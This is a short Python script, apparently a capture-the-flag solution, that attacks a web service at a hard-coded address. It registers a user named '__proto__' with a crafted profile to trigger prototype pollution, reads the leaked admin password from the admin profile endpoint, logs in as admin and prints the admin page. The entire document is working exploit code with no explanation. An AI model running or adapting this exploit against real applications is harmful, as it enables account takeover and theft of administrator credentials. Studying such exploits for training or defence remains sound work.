

BASE_URL = "http://34.170.146.252:60463"


import requests
import sys
s = requests.Session()

r = s.post(
    f"{BASE_URL}/register",
    json={"username": "__proto__", "password": "pw", "profile": {"password": True}},
    timeout=10,
)
print(r.json())

r = s.get(f"{BASE_URL}/profile/admin")
data = r.json()
if "password" not in data:
    print("admin password not leaked. response:", data)
    sys.exit(1)
admin_pw = data["password"]

r = s.post(
    f"{BASE_URL}/login",
    json={"username": "admin", "password": admin_pw},
)
data = r.json()
if data.get("message") != "ok":
    print("login failed:", data)
    sys.exit(1)

r = s.get(f"{BASE_URL}/admin")
print(r.text)

   

